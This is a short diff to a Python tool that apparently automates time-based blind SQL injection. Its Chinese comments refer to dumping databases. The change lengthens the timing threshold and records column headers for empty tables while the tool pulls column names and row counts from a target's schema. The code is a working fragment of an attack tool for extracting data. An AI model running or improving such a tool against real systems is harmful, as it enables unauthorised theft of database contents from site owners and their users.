@@ -9,7 +9,7 @@ from myhttp import HTTP
 """-----定义分隔符-----"""
 
 Global_spilt = "!@Aa@!"
-Global_ExpDict_timeout = 0.1
+Global_ExpDict_timeout = 0.5
 Global_ExpDict_char_min = 33
 Global_ExpDict_char_max = 126
 
@@ -135,6 +135,7 @@ class InjTime(HTTP):
                 f'WHERE TABLE_NAME = \'{tb_name}\' and TABLE_SCHEMA=database()').split(',')
 
             self.Print(f'脱库列名->{tb_name=},{columns=}')
+            self._tbs[tb_name] = [['行'] + columns]
 
             # 脱库_行数
             row_max = self.ExpGet('SELECT COUNT(*) FROM ' + tb_name, True)
@@ -142,7 +143,6 @@ class InjTime(HTTP):
 
             if row_max is None or row_max == 0:
                 continue
-            self._tbs[tb_name] = [['行'] + columns]
             for i in range(row_max):
                 self._tbs[tb_name].append([i + 1])
 
